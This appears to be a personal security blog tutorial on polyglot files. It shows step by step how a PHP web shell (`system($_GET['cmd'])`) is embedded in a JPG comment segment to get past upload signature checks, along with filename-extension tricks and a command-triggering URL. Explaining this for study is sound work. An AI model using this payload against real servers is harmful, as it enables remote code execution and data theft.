---
layout: post
date:   2023-10-02 16:39:14 +0100
---

Polyglot files captivated me while learning cybersecurity. Their clever ability to trick a server and the potential for high-severity attacks made me want to know more about them. Even though one might use various tools for creating them, I was curious how it is done at the byte level.

## Outline

- What are polyglot files
- Why are they important
- How do servers validate the file uploads
- Example: Creating a JPG+PHP file
- Proof of concept

## What are polyglot files?

In computing, polyglots are scripts written in such a way that they are valid in multiple programming languages or file formats. A polyglot file therefore combines one or more formats that can be executed individually without interfering with one another. Some examples are GIF+JS (gifjs) and PNG+Java ARchive (JAR).

Most combinations of different formats can be polyglots, but here’s a list with examples of the most used files.

## Why are they important?

In the security context, attackers can use polyglot files to bypass file upload validation and trigger remote code execution. This can lead to either creating a web shell and/or exfiltrating sensitive data. Deploying a web shell is a critical severity attack. By doing this, an attacker can execute shell commands on the server enabling them to extract sensitive information and gain higher privileges.

## How do servers validate the file uploads?

To better understand how these files can bypass the validation, here are some aspects servers validate on file upload:

1. *The file extension*

    A naive approach is when a server checks the file extension alone. If uploading a file ending with `.png`, the file is accepted as PNG. But depending on how the filename is parsed, `avatar.php.png` or even `avatar.php;.png` can be either a PHP or PNG file.

2. *The submitted MIME-type*

    When uploading an image, the Content-Type request header indicates the file type being uploaded. For example, `Content-Type: image/svg+xml` when uploading an SVG image. This request will be rejected if the server only accepts `image/png`. Implicitly trusting this header is not a robust defense, as an attacker can modify the value of Content-Type.

3. *The file signature*

    Instead of trusting the Content-Type header, some servers will delve into the file’s contents and look for specific markers. Each file type has different signatures. For instance, a JPG will always start with `0xFF 0xD8 0xFF` bytes and end with `0xFF 0xD9`. **Polyglot files are used to bypass this validation**. In cases like these, a file might look like a harmless JPG but still contain malicious code that can be executed by the server.

## Example: Creating a JPG+PHP file

Plenty of web apps allow users to upload profile pictures and JPG format is common for such pictures. To inject PHP code into the file, I needed to make sure the file still respects a JPG structure.

For this example, I already had a valid JPG file starting with this structure:

![Polyglot-JPG-initial-bytes]({{ site.baseurl }}/assets/images/posts/jpg-head.png)

Here are some [details on what these markers mean](https://github.com/corkami/formats/blob/master/image/jpeg.md#diagrams){:target="_blank"} (Also, a great resource for mapping different format signatures).

Following, I injected this PHP code, which allows remote code execution on the web (notice the `cmd` bit):

```php
<?php echo "<br/><br/>"; echo system($_GET["cmd"]); exit() ?>
```

Next, I’m appending this code as hex. I used the comment JPG markers, starting with the `0xFF 0xFE` bytes, followed by two more bytes specifying the comment’s length + 2 in hex (`0x00 0x3F` - 63 in decimal). Here’s the whole buffer at this point:

![Polyglot-JPG-with-injected-php-code]({{ site.baseurl }}/assets/images/posts/jpg-injected.png)

Finally, I appended the rest of the JPG bytes from the original image and saved the buffer in a new file. I already obtained the polyglot file which can be saved as either `.jpg` or `.php`.

If uploading this avatar.php to a PHP server, an attacker might be able to trigger remote code execution by using the URL query parameter - `vulnerable-app.com/avatars/avatar.php?cmd=<COMMAND>`. A successful attacker has now access to the system commands.

In case the avatar.php “image” gets rejected, an attacker can still use the polyglot avatar.jpg. As soon as the server runs this file through the PHP interpreter, it will trigger the exploit. If this doesn't happen by default, the attacker might find other ways to exploit, like a [Local File Inclusion](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html){:target="_blank"} (LFI).

## Proof of concept

I created a script (`phppoly.rb`) that does what I described above. It integrates a string into a JPG file and returns two files in avatar.php & avatar.jpg.

[https://github.com/DariusPirvulescu/phppoly](https://github.com/DariusPirvulescu/phppoly){:target="_blank"}

As a proof of concept, I built a basic PHP server that reads the two polyglot files and returns their file types which should be JPG in both cases. This server can run locally and once it has the avatar.php file, you can navigate to that path and query the cmd to trigger any system command ex: `http://127.0.0.1:8000/avatar.php?cmd=ls .`.

The results of that command will be returned with the HTTP response, and now you have deployed a web shell on that server.

![Polyglot-exploit]({{ site.baseurl }}/assets/images/posts/polyglot-exploit.png)
